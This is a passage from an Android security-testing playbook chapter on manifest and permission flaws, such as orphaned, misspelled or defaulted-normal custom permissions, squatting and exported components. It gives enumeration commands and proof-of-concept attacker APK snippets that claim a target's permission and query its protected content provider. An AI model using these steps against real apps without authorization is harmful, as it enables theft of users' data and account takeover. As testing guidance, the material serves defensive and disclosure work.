# D03 · AndroidManifest & Permission Model

> The manifest is the app's authorisation document, and the permission model is the only thing standing between a zero-permission app on the same device and every component the developer believed was private. Almost every *observation* in this domain is P5 — the exceptions are the ones where a permission string turns out to be obtainable by any installed app, or where the code behind an exported entry point checks itself instead of its caller; those reach P1 through whatever they unlock.

| | |
|---|---|
| **Phases** | P3 inventory, P4 static (the dynamic half of every item lands in P5 IPC) |
| **Milestones** | M3, M4 |
| **VRT ceiling** | Domain-native node is `broken_access_control.exposed_sensitive_android_intent` (**null — rated on what it exposes**). The realistic ceiling is P1 by chaining: `broken_authentication_and_session_management.authentication_bypass` (P1) when the self-granted permission opens a session-issuing surface, `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when it opens a provider keyed by a user id, or `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when it yields a live credential. Everything filed as a manifest attribute alone tops out at `mobile_security_misconfiguration.*` (P5). |
| **Primary attacker model** | **AM-03** zero-permission local app. Secondary: AM-04 (local app holding one common permission), AM-08 (malicious third-party SDK inside the app's own manifest), AM-11 (physical unlocked, for the backup and `pm grant` items). |
| **Maps to** | MASVS-PLATFORM-1, MASVS-CODE, MASVS-STORAGE-2, MASVS-PRIVACY-1. MASTG-TEST-0355, -0254, -0262, -0216, -0364, -0365, -0366, -0285, -0286, -0235, -0315, -0252; MASTG-KNOW-0017, -0132, -0133, -0134; MASTG-TECH-0126, -0127, -0128, -0141, -0150, -0151, -0160, -0161, -0162, -0163; MASWE-0006, -0018, -0047, -0066. CWE-250, CWE-269, CWE-862, CWE-863, CWE-919, CWE-927, CWE-212, CWE-312, CWE-313. ATT&CK T1626, T1626.001, T1453, T1417.001, T1417.002, T1516, T1541, T1582, T1616, T1624.001, T1630.002, T1636.001–.005, T1642, T1643, T1430, T1661. CVE-2019-2200. |

## Why this domain pays

Most of what this domain produces is worthless on its own. "allowBackup is true", "the app requests 14 permissions", "component X is exported" — Google's own invalid-report page says backups enabled is intended behaviour, Xiaomi lists `allowbackup:True` as out of scope, Bugcrowd pins `mobile_security_misconfiguration.auto_backup_allowed_by_default` at P5 with the vector `AV:P/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`, and Google's invalid-reports guidance states plainly that "excessive permissions alone do not have enough of a security impact to qualify for a reward". If your D03 output is a permission inventory, you have produced nothing.

The domain pays in exactly two places. The first is **the permission string that is not a permission**: a component guarded by `android:permission="com.target.X"` where nothing on the device defines `X` (orphan), where the definition omits `protectionLevel` (silently `normal`), where the string is misspelled, where it is a non-permission literal such as `android:permission="true"`, or where an attacker app that defines the name first wins the binding protection level. In every case a twenty-line APK declaring `<permission>` plus `<uses-permission>` is granted the string at install with no prompt, and the component the developer cared most about protecting becomes an ordinary exported component. Google's Mobile VRP lists **"orphaned permissions" by name** in its additional-vulnerability-types-in-scope list — this is one of the few Android-native classes a first-party programme explicitly pays for.

The second is **the enforcement site**: `checkSelfPermission()` in an exported entry point (which asks "do *I* hold this?", and is therefore always true), `checkCallingOrSelfPermission()` (which passes whenever *either* side holds it, so the privileged callee satisfies it on the caller's behalf), `checkCallingPermission()` whose `int` return value is discarded, and any UID check placed after `Binder.clearCallingIdentity()`. That is the confused-deputy core, and its severity is whatever the deputy does. The base rate from the disclosed corpus is honest: ownCloud #145402 listed four exported activities with no permission and paid nothing; the report that paid (#377107, Medium, $750) was the one that found the sink behind one of them, and Twitter Lite #499348 reached **Critical** on the same class. Bitwarden #289000 and Nextcloud #331302 both closed **Low** because the exposed thing was low-value, not because the mechanism was wrong.

Everything else in this chapter — appops, package visibility, backup rules, `intentMatchingFlags`, `sharedUserId` — is either an enabler that removes a triager's objection, or a precondition that raises another domain's finding. Treat it that way and write it up that way.

## The crux question

**Is there any component whose only access control is a permission string that a zero-permission app can obtain — by declaring it, by defining it first, or because nobody ever defined it — and if the string does hold, does the code behind it interrogate the *caller* rather than itself?**

## Triage order

1. **Merged manifest + minSdk/targetSdk.** Everything downstream is version-gated; getting the pair wrong produces both false positives and false negatives and is the single most common reason an Android report is rejected.
2. **`used.txt` minus `defined.txt`.** One `comm -23` finds orphan permissions — the highest-value, lowest-effort finding in the domain, with no install-order race and no user interaction.
3. **`protectionLevel` of everything that *is* defined.** Missing or `normal` means the guard is decorative; `dangerous` means it is one tap.
4. **The live `pm list permissions -f` resolution.** The manifest string and the enforced level diverge. The delta itself is a finding.
5. **The enforcement site for every component that survives 2–4.** `checkSelfPermission` / `checkCallingOrSelf` / discarded `int` / post-`clearCallingIdentity` checks. This is where High and Critical live.
6. **`<activity-alias>`, `<path-permission>`, `android:path`, per-component `android:permission` overrides.** Declaration traps that undo the control the developer applied one line above.
7. **`sharedUserId` sibling set.** If it exists, the target's effective attack surface is the union of every sibling's, and you should be testing the weakest one.
8. **`<queries>` / package-visibility gates and `intentMatchingFlags`.** Not findings themselves; they flip other domains' "the attacker can't reach that" objections.
9. **Dangerous-permission inventory, last.** Only as input to the re-delegation test in step 5 and as impact-ceiling evidence, never as a standalone report.
10. **Backup, debuggable, testOnly.** Cheap, almost always P5, occasionally the only no-root extraction path you have. Prove the extraction or do not file it.

## Items

### D03-001 · Analyse the MERGED manifest, and attribute every entry to the module that injected it

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none (enabler) |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0141 (Inspecting the Merged AndroidManifest), MASTG-TECH-0150 (Analyzing the AndroidManifest), MASTG-TOOL-0124 (aapt2) |

- **Test:** The manifest that is enforced is the one inside the built APK, not `app/src/main/AndroidManifest.xml`. `AD_ID`, `QUERY_ALL_PACKAGES`, foreground-service types, the Photo Picker `ModuleDependencies` service and whole exported components arrive by AAR manifest merge. Reviewing source misses all of it.
- **How:**
  ```bash
  apktool d -f base.apk -o out/           # binary manifest -> XML
  xmllint --format out/AndroidManifest.xml > merged.xml
  jadx --no-src -d jadx_out base.apk      # second opinion: out/resources/AndroidManifest.xml
  aapt2 dump xmltree base.apk --file AndroidManifest.xml | head -80   # raw; exported="true" prints as 0xffffffff
  # if you have the source tree, attribute each entry:
  ./gradlew :app:processReleaseManifest
  grep -nE 'ADDED from|MERGED from' app/build/outputs/logs/manifest-merger-release-report.txt
  diff <(xmllint --format app/src/main/AndroidManifest.xml) merged.xml | head -80
  ```
  For split APKs, decode **every** split (`base`, `config.*`, feature modules) — a component can be declared in a feature split only.
- **Proof:** A side-by-side where the merged manifest contains a `<uses-permission>` or exported component absent from the source manifest, with the merger report line naming the responsible AAR.
- **Escalation:** Named third-party responsibility turns a permission finding into an SDK supply-chain finding -> D18; whatever the SDK exported goes to D04–D07.
- **Ruled out when:** The merged manifest is byte-identical in entry set to the source manifest (only `tools:` attributes and `$` placeholders resolved), and the merger report shows only `ADDED from [main manifest]`. Then no dependency contributed surface and source review was sufficient.

### D03-002 · Fix the API-level matrix from the app's own declaration and bind every finding to it

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none (enabler; it is also the severity-honesty control) |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0315 ("Why minSdkVersion and not targetSdkVersion?"), MASTG-TEST-0252, MASTG-TECH-0117, MASTG-TECH-0150 |

- **Test:** `minSdkVersion` is the security floor; `targetSdkVersion` selects which platform defaults apply to *this* app. MASTG is explicit that using `minSdkVersion` "ensures the test accounts for the least secure environment in which the app can operate". A high target with a low min still ships every legacy behaviour to real users.
- **How:**
  ```bash
  aapt2 dump badging base.apk | grep -E "^sdkVersion|^targetSdkVersion|^compileSdkVersion"
  apkanalyzer manifest print base.apk | grep -E 'minSdkVersion|targetSdkVersion'
  apktool -s d -f base.apk -o out && grep -A3 sdkInfo out/apktool.yml
  adb shell getprop ro.build.version.sdk    # record PER LAB DEVICE, per finding
  ```
  Then write the matrix into the methodology section and repeat it in every finding's *Applies to*: `minSdk=24, targetSdk=35; demonstrated on API 35 (primary) and API 26 (low-end lane); not demonstrated on 24–25`.
- **Proof:** The concrete pair, e.g. `sdkVersion:'21' / targetSdkVersion:'35'`, plus the per-device `ro.build.version.sdk` recorded alongside each PoC.
- **Escalation:** `minSdk<17` re-opens `addJavascriptInterface` reflection RCE and provider default-export (D10/D07); `<24` user-CA trust (D14); `<28` cleartext default (D14); `<30` free package visibility (this chapter) and `setAllowFileAccess` default-true (D10); `<31` implicit component export (this chapter) and PendingIntent mutability (D08).
- **Ruled out when:** A behaviour you were about to report is gated below the app's own `minSdkVersion` — then it is not a finding for this app at all and must be deleted before the QA gate, not defended. Equally, a legacy item is ruled out when the code shows an explicit `Build.VERSION.SDK_INT` guard that takes the hardened branch on every level ≥ minSdk.

### D03-003 · Build the effective-export table, resolving the default per component type and targetSdk

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none (the *reached behaviour* is what gets filed, under `broken_access_control.exposed_sensitive_android_intent`) |
| **Attacker** | AM-03 |
| **Applies to** | all; defaults are version-gated (see below) |
| **Maps to** | MASTG-TECH-0160, -0161, -0162, -0163; MASWE-0018 ("Unintentionally Exported Components"); ATT&CK T1624.001 |

- **Test:** The documented defaults are not uniform and are the most commonly mis-stated fact in Android testing: `<provider>` defaults to `true` at API ≤ 16 and `false` for API 17+ when `targetSdkVersion >= 17`; `<activity>` / `<activity-alias>` / `<service>` / `<receiver>` default to `false` with no intent filter and **`true` with at least one**. From targetSdk 31 an intent-filtered component without an explicit `android:exported` fails the build (`Manifest merger failed : Apps targeting Android 12 and higher are required to specify an explicit value for android:exported...`). Produce a table: component · type · effective exported · `android:permission` · intent-filter actions · scheme.
- **How:**
  ```bash
  python3 - <<'PY'
  import re
  x=open('merged.xml',encoding='utf-8').read()
  for kind in ('activity','activity-alias','service','receiver','provider'):
      for m in re.finditer(r'<%s\b[^>]*?(/>|>.*?</%s>)'%(kind,kind), x, re.S):
          b=m.group(0); head=b.split('>')[0]
          name=re.search(r'android:name="([^"]+)"',head)
          exp=re.search(r'android:exported="(true|false)"',head)
          perm=re.search(r'android:(?:permission|readPermission)="([^"]+)"',head)
          state = exp.group(1) if exp else ('IMPLICIT-EXPORT' if '<intent-filter' in b else 'false')
          print(f'{kind:15} {state:16} perm={perm.group(1) if perm else "-":45} {name.group(1) if name else "?"}')
  PY
  # xmlstarlet alternative, one query per type:
  xmlstarlet sel -t -m "//activity | //activity-alias" -v "name()" -o " " -v "@android:name" \
    -o " exported=" -v "@android:exported" -o " perm=" -v "@android:permission" \
    -o " filters=" -v "count(intent-filter)" -n merged.xml
  ```
- **Proof:** The table itself, with every row's exported verdict derived from targetSdk rather than from the literal attribute, cross-confirmed against D03-004.
- **Escalation:** Every `exported=true perm=-` and `IMPLICIT-EXPORT` row is a test case in D04 (activities), D05 (receivers), D06 (services), D07 (providers).
- **Ruled out when:** Every component either has no `<intent-filter>` and no `android:exported="true"`, or carries `android:exported="false"` explicitly, **and** D03-004 confirms none of them appears in the live resolver tables. Asserting "no exported components" from a grep for `exported="true"` on a `targetSdk < 31` app is a false negative that kills the engagement, not a true negative.

### D03-004 · Reconcile the manifest against the live PackageManager resolver tables

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none (enabler) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0160/-0161/-0162/-0163, MASTG-TOOL-0004 (adb); drozer `app.package.attacksurface` |

- **Test:** The manifest and the enforced state diverge when a component is enabled or disabled at runtime with `PackageManager.setComponentEnabledSetting`, when an OEM overlay changes it, or when a split you did not decode declares it. The device is the ground truth for reachability; the manifest is the ground truth for intent.
- **How:**
  ```bash
  adb shell dumpsys package $PKG | awk '/^Activity Resolver Table:/{s=1} /^Receiver Resolver Table:/{s=0} s'
  adb shell dumpsys package $PKG | awk '/^Receiver Resolver Table:/{s=1} /^Service Resolver Table:/{s=0} s'
  adb shell dumpsys package $PKG | awk '/^Service Resolver Table:/{s=1} /^Domain verification status:/{s=0} s'
  adb shell dumpsys package $PKG | grep -i "Provider{"
  adb shell cmd package query-activities --components -p $PKG -a android.intent.action.MAIN
  # drozer, from an ordinary third-party UID (this is the view that matters):
  adb forward tcp:31415 tcp:31415 && drozer console connect
  #   run app.package.attacksurface com.target.app
  #   run app.activity.info -a com.target.app -u    # -u also lists UNexported
  #   run app.provider.info -a com.target.app
  ```
  MASTG-TECH-0160 warns verbatim that these commands "do not replace manifest inspection and do not enumerate every activity declared by the package or every associated permission" — use both halves.
- **Proof:** A component present in a resolver table but absent from your table from D03-003 (enabled at runtime), or vice versa. Either divergence must be resolved before you declare the surface closed.
- **Escalation:** Newly discovered components go straight into D04–D07.
- **Ruled out when:** The resolver-table set and the manifest-derived set are identical after normalising alias names, and `grep -rn 'setComponentEnabledSetting' sources/` returns nothing. Then no runtime component flipping exists.

### D03-005 · Read the permission model from PackageManager, not from the manifest, and decode the numeric protectionLevel

| | |
|---|---|
| **Severity ceiling** | High (when the declared level and the enforced level differ) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; definer-wins resolution is PackageManager behaviour, not a targetSdk gate |
| **Maps to** | `android.content.pm.PermissionInfo` constants; `getProtection()` / `getProtectionFlags()`; MASTG-KNOW-0017 |

- **Test:** The manifest string and the *enforced* level diverge — another app defined the name first, an OEM overrode it, or the platform normalised it. Read the resolved level from the device and decode the flag bits: the base level is the low nibble, the modifiers are bits above it.
- **How:**
  ```bash
  adb shell pm list permissions -f -g | grep -B4 -A4 '<target.vendor.prefix>'
  adb shell dumpsys package $PKG | sed -n '/declared permissions/,/requested permissions/p'
  adb shell dumpsys package | grep -A3 'Permission \[com.target.permission.X\]'
  ```
  Decode against `PermissionInfo`: base `PROTECTION_NORMAL`=0, `PROTECTION_DANGEROUS`=1, `PROTECTION_SIGNATURE`=2, `PROTECTION_SIGNATURE_OR_SYSTEM`=3 (deprecated), `PROTECTION_INTERNAL`=4. Flags: `PRIVILEGED`=0x10 (same bit as the old `SYSTEM`), `DEVELOPMENT`=0x20, `APPOP`=0x40, `PRE23`=0x80, `INSTALLER`=0x100, `VERIFIER`=0x200, `PREINSTALLED`=0x400, `SETUP`=0x800, `INSTANT`=0x1000, `RUNTIME_ONLY`=0x2000, `ROLE`=0x4000, `KNOWN_SIGNER`=0x8000.
- **Proof:** `pm list permissions -f` prints, per permission, the **current definer** (`package:`) and `protectionLevel:`. A paste where the APK manifest says `signature` and `pm list permissions -f` says `normal` is, on its own, a complete finding. A permission string used in the manifest that `pm list permissions -f` does not print at all proves it is an orphan (-> D03-008).
- **Escalation:** This is the confirmation step for D03-008 through D03-015; without it a squatting claim is theoretical.
- **Ruled out when:** Every permission string the app enforces resolves on device to `package:<the target's own package>` with a `protectionLevel` of `signature`, `signature|privileged` or `signature|knownSigner`, matching the manifest byte for byte. Then the declared model is the enforced model.

### D03-006 · Prove every reachability claim from a separate, zero-permission attacker APK — never from `adb shell am` alone

| | |
|---|---|
| **Severity ceiling** | Support (it is what converts every other item into a payable finding) |
| **VRT** | none (evidence discipline) |
| **Attacker** | AM-03 |
| **Applies to** | all IPC and permission findings |
| **Maps to** | YesWeHack Android recon guidance ("for these attacks to not be considered 'self-exploitation' ... you need to provide a PoC from a third-party application that you control yourself"); Intigriti triage standard ("the simplest possible demonstration that proves the vulnerability's exploitability and impact beyond reasonable doubt") |

- **Test:** `adb shell am` runs as UID 2000 (`shell`), which holds permissions no ordinary app has, and drozer's agent likewise. A finding demonstrated only that way is self-exploitation and closes. Re-implement in a minimal APK whose manifest declares **no** `<uses-permission>` at all, signed with a key unrelated to the target's.
- **How:** Attacker manifest skeleton, plus the UID/context proof line:
  ```xml
  <manifest package="com.poc.attacker" xmlns:android="http://schemas.android.com/apk/res/android">
    <!-- deliberately NO uses-permission elements -->
    <application android:label="Battery Helper">
      <activity android:name=".ExploitActivity" android:exported="true"/>
    </application>
  </manifest>
  ```
  ```java
  Log.i("POC", "PID:" + Process.myPid() + " UID:" + Process.myUid());
  ```
  ```bash
  adb install attacker.apk
  adb shell dumpsys package com.poc.attacker | sed -n '/requested permissions/,/install permissions/p'   # must be empty
  adb shell am start -n com.poc.attacker/.ExploitActivity
  adb logcat -s POC
  # expect: uid=10222(u0_a222)  context=u:r:untrusted_app:s0:c222,c256,c512,c768
  ```
- **Proof:** `dumpsys package com.poc.attacker` showing an empty requested-permission set, the logcat line proving `untrusted_app` SELinux context, and the target's side effect occurring. State in the report body, in words, that the PoC app requests no permissions — H1 #185862 (Twitter location, $560) turned on exactly that sentence.
- **Escalation:** Raises an otherwise-Medium information disclosure to High/Critical, because the install prompt shows the victim nothing and there is no consent step to blame.
- **Ruled out when:** The PoC app, holding no permissions, receives `java.lang.SecurityException: Permission Denial: ... requires <perm>` or `... not exported from uid`. Capture that exception — it is your true negative, and it is stronger evidence than "I did not find anything".

### D03-007 · Count your sweep results — the shell-loop ban applied to manifest and permission enumeration

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none (false-positive / false-negative discipline) |
| **Attacker** | n/a |
| **Applies to** | every automated manifest, permission or component sweep, including agent-driven ones |
| **Maps to** | Claude-BugHunter `bb-methodology` PART 4 "Shell-Loop Ban"; the Body-Diff Rule, restated for IPC below |

- **Test:** zsh array expansion fails **silently**. A loop such as `for c in "${components[@]}"; do adb shell am start -n "$PKG/$c"; done` can produce zero iterations, with output that looks complete, when the array was never populated by the previous command. The corpus records ~50 probes lost to exactly this. Anything iterating more than five items goes to Python with per-iteration `try/except` and explicit logging — and you **count the results**.
- **How:**
  ```python
  import subprocess, json
  comps = [l.split()[-1] for l in open('components.txt') if l.strip()]
  print(f"[plan] {len(comps)} components to probe")
  ok = 0
  for c in comps:
      try:
          r = subprocess.run(['adb','shell','am','start','-n',f'{PKG}/{c}'],
                             capture_output=True, text=True, timeout=20)
          denied = 'SecurityException' in r.stderr or 'Permission Denial' in r.stderr
          print(json.dumps({'component': c, 'denied': denied, 'out': r.stdout.strip()[:200]}))
          ok += 1
      except Exception as e:
          print(json.dumps({'component': c, 'error': str(e)}))
  print(f"[done] {ok}/{len(comps)} probed")   # if these two numbers differ, the sweep ate something
  ```
- **Proof:** `[done] N/N` where N equals the component count from D03-003. If you expected 100 probes and logged fewer than 100 lines, the sweep is invalid and the negative result cannot be reported.
- **Escalation:** Applies retroactively to D04–D08 sweeps; a miscounted sweep is how a Critical gets missed.
- **Ruled out when:** n/a — this is a mandatory control on your own work, not a property of the target. The related **Body-Diff Rule** applies to every "permission bypass" claim in this chapter: `Status: ok` from `am start` is a status code, not a body. An activity that starts and immediately `finish()`es without executing its privileged path is not a bypass. Capture the *side effect* (a returned Cursor, a written file, a network request, a changed row), not the launch result.

### D03-008 · Orphan permission — a component guarded by a permission string nobody defines

| | |
|---|---|
| **Severity ceiling** | **Critical** (inherited from the component behind it) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) escalating to `broken_authentication_and_session_management.authentication_bypass` (P1) or `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | **all versions.** No install-order race, no user interaction, not fixed by any platform change. Reachable on current Android whenever the defining package is simply absent. |
| **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions` — "Orphaned permissions": *privileged app uses undefined permission to protect a component; malicious app defines that orphaned permission first; malicious app gains access to protected component*. Android Lint check `CustomPermissionTypo`. MobSF `exported_protected_permission_not_defined`. Google Mobile VRP lists **"orphaned permissions"** by name in "Additional vulnerability types in scope". MASWE-0018, CWE-862/CWE-863 |

- **Test:** The highest-yield item in the domain. If the target protects a component with `android:permission="com.target.X"` but ships no matching `<permission>` element — typo, stale manifest, wrong module in the build, or a permission defined only by a sibling app the victim never installed — then `X` does not exist. An attacker defines it and is granted it immediately.
- **How:**
  ```bash
  # every permission string USED to protect something
  grep -oE 'android:(permission|readPermission|writePermission)="[^"]+"' merged.xml \
    | cut -d'"' -f2 | sort -u > used.txt
  # every permission string DEFINED
  grep -oE '<permission[^>]+android:name="[^"]+"' merged.xml \
    | grep -oE 'android:name="[^"]+"' | cut -d'"' -f2 | sort -u > defined.txt
  comm -23 used.txt defined.txt | grep -v '^android\.permission\.'   # orphan candidates
  # also cover <path-permission> and the <application>-level attribute
  grep -oE '<path-permission[^>]*android:(read|write)?[Pp]ermission="[^"]+"' merged.xml
  # confirm on-device that PackageManager does not know the string
  adb shell pm list permissions -f | grep -c 'com.target.permission.ORPHAN'   # expect 0
  ```
  Then the squatter APK:
  ```xml
  <permission android:name="com.target.permission.ORPHAN" android:protectionLevel="normal"/>
  <uses-permission android:name="com.target.permission.ORPHAN"/>
  ```
  ```bash
  adb install squat.apk
  adb shell dumpsys package com.poc.attacker | grep -A3 'install permissions'
  adb shell content query --uri content://com.target.provider/secrets   # or am start / am startservice
  ```
- **Proof:** Three lines together: (1) `pm list permissions -f` yields **no** entry for the string before you install the squatter; (2) after install, `dumpsys package com.poc.attacker` shows it under `install permissions:` with `granted=true` and **no user prompt was shown**; (3) the protected component returns data or performs its side effect where it previously threw `SecurityException`.
- **Escalation:** -> D07 (provider read), D06 (bound-service call), D05 (broadcast injection). If the reached component issues, refreshes or returns a session token, the chain terminates in `broken_authentication_and_session_management.authentication_bypass` (P1). File the orphan as its own primitive first, then the consumer (see D03-069).
- **Ruled out when:** `comm -23 used.txt defined.txt` is empty after removing platform `android.permission.*` names, **and** `adb shell pm list permissions -f` prints every remaining string with `package:` equal to the target or to a package that ships in the same install unit and cannot be uninstalled independently. Run the diff across the whole vendor app suite, not one APK — the definer is frequently a sibling.

### D03-009 · Custom `<permission>` with no `protectionLevel` — it silently becomes `normal`

| | |
|---|---|
| **Severity ceiling** | **Critical** (inherited) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0355 — *"the same applies when no protection level is configured and becomes automatically `android:protectionLevel="normal"`, which is granting access automatically to any requesting app"*; MASTG-KNOW-0017; MobSF `exported_protected_permission_normal`; MASWE-0018 |

- **Test:** A `<permission>` element without an explicit `protectionLevel` attribute defaults to `normal`, which is auto-granted at install to any app that asks. The component behind it is therefore exported to the entire device while appearing protected in every static review that only greps for `android:permission=`.
- **How:**
  ```bash
  grep -oE '<permission[^>]*>' merged.xml | grep -v protectionLevel     # the defaulting ones
  python3 - <<'PY'
  import xml.dom.minidom as m
  d=m.parse('merged.xml'); NS='android'
  lvl={}
  for p in d.getElementsByTagName('permission'):
      lvl[p.getAttribute(f'{NS}:name')] = p.getAttribute(f'{NS}:protectionLevel') or 'normal(DEFAULTED)'
  for tag in ('activity','activity-alias','service','receiver','provider'):
      for c in d.getElementsByTagName(tag):
          for attr in ('permission','readPermission','writePermission'):
              v=c.getAttribute(f'{NS}:{attr}')
              if v:
                  print(tag, c.getAttribute(f'{NS}:name'), attr, v, '->',
                        lvl.get(v,'UNDEFINED-IN-THIS-APK'))
  PY
  ```
- **Proof:** The cross-join output showing a component whose guard resolves to `normal(DEFAULTED)`, plus the zero-permission PoC app from D03-006 holding the permission `granted=true` with no prompt and reaching the component.
- **Escalation:** Identical to D03-008. A `normal`-level guard on a token-issuing service is direct account takeover.
- **Ruled out when:** Every `<permission>` element the app both defines and enforces carries an explicit `protectionLevel` of `signature`, `signature|privileged` or `signature|knownSigner`, confirmed on-device by D03-005.

### D03-010 · `normal` or `dangerous` protectionLevel guarding a privileged action

| | |
|---|---|
| **Severity ceiling** | **Critical** (inherited) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) or `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 (normal) / AM-04 (dangerous — one tap) |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0355, MASTG-KNOW-0017, MASWE-0018, CWE-862/863; H1 #289000 (Bitwarden, Low — the fix shape); MobSF `exported_protected_permission_normal` / `..._dangerous` (MobSF counts these components as **exported**) |

- **Test:** `normal` "most apps can request and get it" — it is auto-granted with no prompt. `dangerous` is "approved by many users" and is one tap on a dialog the attacker's own app frames however it likes. Neither is an access control between apps. Only `signature` (or `signature|privileged` / `signature|knownSigner`) ties access to a signing certificate.
- **How:**
  ```bash
  grep -nE '<permission [^>]*protectionLevel="(normal|dangerous)"' merged.xml
  adb shell pm list permissions -d -g | grep -i com.target      # dangerous ones, grouped
  ```
  In the PoC app, for `normal` just declare `<uses-permission>`; for `dangerous` also request at runtime:
  ```java
  ActivityCompat.requestPermissions(this, new String[]{"com.target.permission.READ_KEYS"}, 9001);
  Uri uri = Uri.parse("content://com.target.provider/Keys");
  Cursor c = getContentResolver().query(uri, new String[]{"*"}, null, null, null);
  textView.setText(DatabaseUtils.dumpCursorToString(c));
  ```
  Bitwarden's remediation is the reference correct shape:
  ```xml
  <permission android:name="com.x8bit.bitwarden.PackageReplacedReceiverPermission"
              android:protectionLevel="signature" />
  <receiver android:name="com.x8bit.bitwarden.PackageReplacedReceiver" android:exported="true"
            android:permission="com.x8bit.bitwarden.PackageReplacedReceiverPermission"/>
  ```
- **Proof:** `dumpsys package com.poc.attacker | grep -A20 'install permissions'` showing the custom permission `granted=true` with no prompt (normal) or after a single tap (dangerous), followed by `dumpCursorToString()` returning the protected table's rows — the data, not a 200-equivalent.
- **Escalation:** -> D06 (bound service), D07 (provider), D05 (broadcast), D23 (entitlement/payment). Rate on the action reached, never on the protection level.
- **Ruled out when:** The permission is `signature`-based **and** D03-005 confirms the on-device definer is the target itself **and** D03-013/D03-014 show no squatting path. A `dangerous` level is additionally ruled out only if the guarded component is genuinely benign — rate it, do not dismiss it.

### D03-011 · Permission-name typo, case mismatch, or a non-permission literal

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions` — Lint check `CustomPermissionTypo`, and explicitly *"invalid values like `android:permission="true"` are treated as custom permissions"*; Google's vulnerability-classes material, class "Typos in custom permissions": *"when used custom permissions don't match declared custom permissions, Android defaults to silently failing to enforce the permission"*; H1 **#440749** (Mail.Ru Android — typo in permission name allows writing contacts without user knowledge) |

- **Test:** Two failure shapes, both silent at build time. (a) The component is guarded by `MY_PREM` while the manifest declares `MY_PERM` — Android creates no such permission and the guard never fires. (b) The developer wrote a literal such as `android:permission="true"` — the platform treats it as a custom permission name, nobody holds it, the component looks locked, and an attacker defines it.
- **How:**
  ```bash
  # values that are neither a platform permission nor a locally declared one
  grep -oE 'android:(permission|readPermission|writePermission)="[^"]*"' merged.xml \
    | cut -d'"' -f2 | sort -u | grep -vE '^android\.permission\.[A-Z_]+$'
  # the literal-value class
  grep -nE 'android:permission="(true|True|false|1|0|@[a-z]+/)' merged.xml
  # frequency: a permission string used exactly once, that is near-identical to another, is the typo
  grep -oE 'android:permission="[^"]+"' merged.xml | sort | uniq -c | sort -rn
  # build-side detector, if you have the source
  ./gradlew lint    # check id: CustomPermissionTypo
  ```
  Repeat the diff across **every APK in the vendor's suite** — the declaring app may be a sibling package, and a one-character difference between the two is the bug.
- **Proof:** `adb shell pm list permissions -f | grep '<the misspelled string>'` returning nothing, plus the zero-permission PoC reaching the component after defining the misspelled name at `normal`.
- **Escalation:** Identical to D03-008; and the absence of `CustomPermissionTypo` from the build's lint configuration is itself worth a one-line remediation note.
- **Ruled out when:** Every enforced string matches a declared string byte for byte (including case) within the app or a co-installed sibling, and `pm list permissions -f` resolves all of them. Levenshtein-1 near-misses between `used.txt` and `defined.txt` must be individually explained, not assumed benign.

### D03-012 · `android:uses-permission` on a component tag, or `<uses-permission>` nested inside one

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | Oversecured "Common mistakes when using permissions in Android" — typos in component declarations; MASWE-0018 |

- **Test:** Two structural mistakes the platform ignores without a build error. (a) `android:uses-permission="..."` written on an `<activity>`/`<service>`/`<receiver>` where `android:permission` was meant — the component has **no** guard. (b) A `<uses-permission>` element nested inside a component tag instead of being a direct child of `<manifest>` — the app does not request the permission at all, and any component that relied on holding it fails open or silently degrades.
- **How:**
  ```bash
  grep -nE 'android:uses-permission=' merged.xml     # always a bug on a component element
  # structural check: <uses-permission> must be a direct child of <manifest>
  python3 - <<'PY'
  import xml.dom.minidom as m
  d=m.parse('merged.xml')
  for u in d.getElementsByTagName('uses-permission'):
      if u.parentNode.tagName != 'manifest':
          print('MISPLACED <uses-permission> inside <%s>: %s'
                % (u.parentNode.tagName, u.getAttribute('android:name')))
  PY
  ```
  Read the manifest structurally, not by grep alone.
- **Proof:** The XML excerpt showing the misplacement, plus the component executing for the zero-permission PoC app with no `SecurityException` in `adb logcat`.
- **Escalation:** The component is an ordinary unguarded exported component — re-run D04–D07 against it.
- **Ruled out when:** No `android:uses-permission` attribute exists anywhere, and every `<uses-permission>` element's parent is `<manifest>`.

### D03-013 · Permission squatting — the attacker defines the target's custom permission first

| | |
|---|---|
| **Severity ceiling** | **High** (Critical when the guarded interface issues tokens or performs privileged writes) |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all — but the install-order precondition must be demonstrated on the tested platform version, not assumed. Android 5.0 tightened same-name definitions toward requiring the same signing key; state the API level you proved it on. |
